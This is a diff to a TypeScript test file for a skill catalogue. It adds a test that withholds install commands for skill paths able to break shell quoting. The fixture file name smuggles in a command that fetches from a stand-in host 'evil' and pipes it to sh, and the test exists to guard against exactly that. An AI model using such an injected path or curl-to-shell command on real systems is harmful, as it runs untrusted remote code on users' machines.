@@ -3,7 +3,6 @@ import {
   ANNOTATION_COMMIT,
   ANNOTATION_EVAL_SCORE,
   ANNOTATION_EVAL_SCORE_REF,
-  ANNOTATION_INSTALL,
   ANNOTATION_SOURCE_LOCATION,
   readEvalScore,
   readInstallCommands,
@@ -219,6 +218,30 @@ publish:
     // The score was measured somewhere other than the pinned commit, and the
     // detail page has to be able to say so.
     expect(score.measuredCommit).toBe(measuredAt);
+  });
+
+  it('publishes no install command for a path that could break its own quoting', async () => {
+    const { entities } = await buildEntities({
+      repo: REPO,
+      commitSha: SHA,
+      manifest: parseManifest(
+        "owner: team\npublish:\n  skills: 'skills/*/SKILL.md'\n",
+      ),
+      ...repository({
+        "skills/a'; curl evil | sh; '/SKILL.md": '---\ndescription: hostile\n---\n',
+        'skills/honest/SKILL.md': '---\ndescription: fine\n---\n',
+      }),
+    });
+
+    const hostile = entities.find(e => e.metadata.description === 'hostile')!;
+    // Browsable and readable, but nothing to paste into a shell.
+    expect(hostile).toBeDefined();
+    expect(readInstallCommands(hostile)).toEqual({});
+    expect(
+      readInstallCommands(
+        entities.find(e => e.metadata.description === 'fine')!,
+      ).claude,
+    ).toContain('ainb skill install');
   });
 
   it('reports a repository with zero assets rather than losing it', async () => {
